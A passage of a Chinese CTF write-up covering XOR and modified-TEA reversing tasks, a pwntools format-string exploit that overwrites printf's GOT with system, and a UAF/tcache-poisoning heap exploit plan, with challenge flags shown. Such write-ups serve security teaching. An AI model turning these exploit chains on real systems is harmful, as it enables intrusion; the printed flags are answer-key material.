RE2</h3>\n<p>首先 shfit+F12 在 strings 窗口看到有关 flag 的明文字符，交叉引用定位 check 函数。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/9b5fe8265403314329b3c674044bb68b.png\" alt=\"image-20220608102221703\" /></p>\n<p>可见被去了符号，可以根据明文信息判断 printf 等系统函数或者结合 IDA 自带的 Lumina 恢复符号 (不过效果不是很明显)。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/da8d38b07b5e7cf03c41a567f48d5153.png\" alt=\"image-20220608102354592\" /></p>\n<p>根据反编译代码结构大致猜测是对输入明文进行了异或处理 (或其他更多操作)，可以结合调试来判断，构造输入为 flag {aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/8f3cf2b4c05deabfe371be3385cfd607.png\" alt=\"image-20220608103006635\" /></p>\n<p>V5 首先指向输入附近，继续单步发现 v9 指向输入字符串的首部指针，V10 指向尾部指针。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/909ed8188b35431bcc1e4bb5116a0d4a.png\" alt=\"image-20220608103326614\" /></p>\n<p>之后通过首位指针来让整个字符串异或 7，并保存 v6 的结构体内 (v6 应该是个结构体，其地址处的第二个指针指向加密后的结果)。最终将加密结果与 &amp; unk_7FF6EFEE78D0 指向的结构体中的密文比对。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444666/Typera/2023/04/65edca9055c4a728e1d318e7368d47f7.png\" alt=\"image-20220608103527434\" /></p>\n<p>密文在其指向地址的第二个指针。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/a0381cbf6ff1dc1230b451116c3934e0.png\" alt=\"image-20220608103552293\" /></p>\n<p>综上，提取出密文异或即可。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s=[<span class=\"number\">0x61</span>, <span class=\"number\">0x6B</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x60</span>, <span class=\"number\">0x7C</span>, <span class=\"number\">0x31</span>, <span class=\"number\">0x3F</span>, <span class=\"number\">0x37</span>, <span class=\"number\">0x37</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x35</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x31</span>, <span class=\"number\">0x3F</span>, <span class=\"number\">0x36</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x3E</span>, <span class=\"number\">0x3E</span>, <span class=\"number\">0x62</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0x36</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x3F</span>, <span class=\"number\">0x37</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x35</span>, <span class=\"number\">0x3E</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x32</span>, <span class=\"number\">0x36</span>, <span class=\"number\">0x34</span>, <span class=\"number\">0x3E</span>, <span class=\"number\">0x7A</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(s)):</span><br><span class=\"line\">    s[i]^=<span class=\"number\">7</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">bytes</span>(s))</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;6800b2a681c99eb41780b7b294ac5139&#125;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"re3\"><a class=\"anchor\" href=\"#re3\">#</a> RE3</h3>\n<p>拖入 IDA，观察 main 函数逻辑。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444666/Typera/2023/04/7f7e210fc34a6bc3fcfb1bb2d1cd4b34.png\" alt=\"image-20220608104456550\" /></p>\n<p>首先是输入 32 位数据存入 buffer，之后无论如何都会进入 LABLE_5 并且将输入 2 个一组作为 16 进制数据存入 v21，并且计算出总字节数的长度 len，对 len 进行 &gt;&gt;3，也就是 8 个一组。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/995c29f2976872b6b957bee05684239a.png\" alt=\"image-20220608105103276\" /></p>\n<p>之后 8 个一组内进行上述加密，根据其结构可以判断出是魔改的 Tea 加密，还原算法如下。</p>\n<p>根据补码运算 v12-0x61c88647 可以看成 v12+0x100000000-0x61c88647 等价于 v12 + 0x9e3779b9。</p>\n<p><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">Tea_Encrypt</span><span class=\"params\">(ut32* src, ut32* k)</span> &#123;</span><br><span class=\"line\">\tut32 sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tut32 v0 = src[<span class=\"number\">0</span>];</span><br><span class=\"line\">\tut32 v1 = src[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x20</span>; i++) &#123;</span><br><span class=\"line\">\t\tsum += <span class=\"number\">0x9e3779b9</span>;</span><br><span class=\"line\">\t\tv0 += ((v1 &lt;&lt; <span class=\"number\">3</span>) + k[<span class=\"number\">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class=\"number\">5</span>) + k[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t\tv1 += ((v0 &lt;&lt; <span class=\"number\">3</span>) + k[<span class=\"number\">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class=\"number\">5</span>) + k[<span class=\"number\">3</span>]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsrc[<span class=\"number\">0</span>] = v0;</span><br><span class=\"line\">\tsrc[<span class=\"number\">1</span>] = v1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>魔改点再模数 v1 和 v0 左移三位，并且 key 是 {18,52,86,120}，结合上述条件写出求逆脚本。</p>\n<p><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ut32 unsigned int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> delta 0x9E3779B9</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">Tea_Decrypt</span><span class=\"params\">(ut32* enc, ut32* k)</span> &#123;</span><br><span class=\"line\">\tut32 sum = delta * <span class=\"number\">0x20</span>;</span><br><span class=\"line\">\tut32 v0 = enc[<span class=\"number\">0</span>];</span><br><span class=\"line\">\tut32 v1 = enc[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x20</span>; i++) &#123;</span><br><span class=\"line\">\t\tv1 -= ((v0 &lt;&lt; <span class=\"number\">3</span>) + k[<span class=\"number\">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class=\"number\">5</span>) + k[<span class=\"number\">3</span>]);</span><br><span class=\"line\">\t\tv0 -= ((v1 &lt;&lt; <span class=\"number\">3</span>) + k[<span class=\"number\">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class=\"number\">5</span>) + k[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t\tsum -= delta;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tenc[<span class=\"number\">0</span>] = v0;</span><br><span class=\"line\">\tenc[<span class=\"number\">1</span>] = v1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\tut32 m[<span class=\"number\">4</span>] = &#123; <span class=\"number\">0x6278CC2F</span>,<span class=\"number\">0x65FE5089</span> ,<span class=\"number\">0x2B581C7C</span>,<span class=\"number\">0x4E60BA90</span> &#125;;</span><br><span class=\"line\">\tut32 k[<span class=\"number\">4</span>] = &#123; <span class=\"number\">18</span>,<span class=\"number\">52</span>,<span class=\"number\">86</span>,<span class=\"number\">120</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i += <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">\t\tTea_Decrypt(m+i, k);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">16</span>; i++) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%02x&quot;</span>, *((<span class=\"type\">unsigned</span> <span class=\"type\">char</span>*)m + i));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//flag&#123;35f0be164cf02aa7c59ca09de5d7bb78&#125;</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"pmagic\"><a class=\"anchor\" href=\"#pmagic\">#</a> pmagic</h3>\n<p>以下是俩个格式化字符串漏洞的位置。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444666/Typera/2023/04/a60c1fa88d00bafbe95816ea1a206fbd.png\" alt=\"image-20220608113001740\" /></p>\n<p>第一次运行：</p>\n<ol>\n<li>利用格式化字符串 leak 出 libc 基址。</li>\n<li>利用格式化字符串漏洞同时覆写 printf 的 got 表为 system，同时覆写 _fini_array 为 0x400640 使再次运行。本题有个更简便的方法就是覆写 exit 的 hook 为 one_gadget，大家也可以尝试。</li>\n</ol>\n<p>第二次运行：</p>\n<ol>\n<li>由于只能读入五个字符，直接  <code>cat *</code>  拿 flag。</li>\n</ol>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python2</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data) </span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">lg = <span class=\"keyword\">lambda</span> name,data : p.success(name + <span class=\"string\">&#x27;: \\033[1;36m 0x%x \\033[0m&#x27;</span> % data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\"><span class=\"built_in\">breakpoint</span>=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">    glibc_dir = <span class=\"string\">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span></span><br><span class=\"line\">    gdbscript = <span class=\"string\">&#x27;directory %smalloc/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdio-common/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdlib/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %slibio/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    elf_base = <span class=\"built_in\">int</span>(os.popen(<span class=\"string\">&#x27;pmap &#123;&#125;| awk \\x27&#123;&#123;print \\x241&#125;&#125;\\x27&#x27;</span>.<span class=\"built_in\">format</span>(p.pid)).readlines()[<span class=\"number\">1</span>], <span class=\"number\">16</span>) <span class=\"keyword\">if</span> elf.pie <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;b *&#123;:#x&#125;\\n&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">int</span>(<span class=\"built_in\">breakpoint</span>) + elf_base) <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(<span class=\"built_in\">breakpoint</span>, <span class=\"built_in\">int</span>) <span class=\"keyword\">else</span> <span class=\"built_in\">breakpoint</span></span><br><span class=\"line\">    gdb.attach(p, gdbscript)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pmagic&#x27;</span>)</span><br><span class=\"line\">context(arch = elf.arch, os = <span class=\"string\">&#x27;linux&#x27;</span>,log_level = <span class=\"string\">&#x27;debug&#x27;</span>,terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-hp&#x27;</span>,<span class=\"string\">&#x27;62&#x27;</span>])</span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./pmagic&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;101.133.134.12&#x27;</span>,<span class=\"number\">10000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sea(<span class=\"string\">&#x27;Give me your name.\\n&#x27;</span>,<span class=\"string\">&#x27;%15$p&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_leak = <span class=\"built_in\">int</span>(rc(<span class=\"number\">14</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">libc_base = libc_leak - <span class=\"number\">0x5f1718</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\">system_addr = libc.sym.system</span><br><span class=\"line\">bin_sh = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\">og = <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">❯ one_gadget libc-2.23.so -l2</span></span><br><span class=\"line\"><span class=\"string\">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  rax == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rsp+0x30] == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0xcd0f3 execve(&quot;/bin/sh&quot;, rcx, r12)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rcx] == NULL || rcx == NULL</span></span><br><span class=\"line\"><span class=\"string\">  [r12] == NULL || r12 == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0xcd1c8 execve(&quot;/bin/sh&quot;, rax, r12)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rax] == NULL || rax == NULL</span></span><br><span class=\"line\"><span class=\"string\">  [r12] == NULL || r12 == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rsp+0x50] == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0xf02b0 execve(&quot;/bin/sh&quot;, rsi, [rax])</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rsi] == NULL || rsi == NULL</span></span><br><span class=\"line\"><span class=\"string\">  [[rax]] == NULL || [rax] == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rsp+0x70] == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0xf66f0 execve(&quot;/bin/sh&quot;, rcx, [rbp-0xf8])</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rcx] == NULL || rcx == NULL</span></span><br><span class=\"line\"><span class=\"string\">  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">ones = [libc_base + <span class=\"built_in\">int</span>(i,<span class=\"number\">16</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> re.findall(<span class=\"string\">r&#x27;\\n(.+?) execve&#x27;</span>,og)]</span><br><span class=\"line\"><span class=\"comment\"># sl((fmtstr_payload(8,&#123;(elf.got[&#x27;printf&#x27;]):system_addr,(0x600A78):0x400640&#125;)).ljust(0x100,&#x27;\\0&#x27;))</span></span><br><span class=\"line\">sea(<span class=\"string\">&#x27;Say something.\\n&#x27;</span>,(fmtstr_payload(<span class=\"number\">8</span>,&#123;(elf.got[<span class=\"string\">&#x27;printf&#x27;</span>]):system_addr,(<span class=\"number\">0x600A78</span>):<span class=\"number\">0x400640</span>&#125;)).ljust(<span class=\"number\">0x100</span>,<span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\"># flag&#123;9cc94030040c64f2122706df577d15ee&#125;</span></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444669/Typera/2023/04/d26beea959cbaa17cbecb1d5b70d5514.png\" alt=\"image-20220608114145159\" /></p>\n<h3 id=\"orw_h2\"><a class=\"anchor\" href=\"#orw_h2\">#</a> orw_h2</h3>\n<p>libc 2.31 下的经典菜单堆题。</p>\n<p>漏洞很简单，free 掉堆块的时候没有清空指针，是一个很直接的 <strong>UAF</strong>：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/57e330134d62778bbe29225751d63f8d.png\" alt=\"image-20220608113201143\" /></p>\n<p>思路：</p>\n<ol>\n<li>基本堆布局，利用 Largebin 残留指针 leak 出 libc 基址和堆基址。</li>\n<li>利用 Tcache Poisoning 构造一次任意分配堆块到 __free_hook 写  <code>rdx,QWORD PTR [rdi+0x8];mov QWORD PTR [rsp],rax;call   QWORD PTR [rdx+0x20]</code>  这个 gadget 的地址。</li>\n<li>利用写入的 gadget  配合 setcontext 构造栈迁移，改堆块为 rwx 权限，读入 shellcode 执行 shellcode 拿 flag。或者非常确定 flag 的文件名和路径的情况下，拿 orw 链子直接读 flag 也是可以的。</li>\n</ol>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python2</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data) </span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, 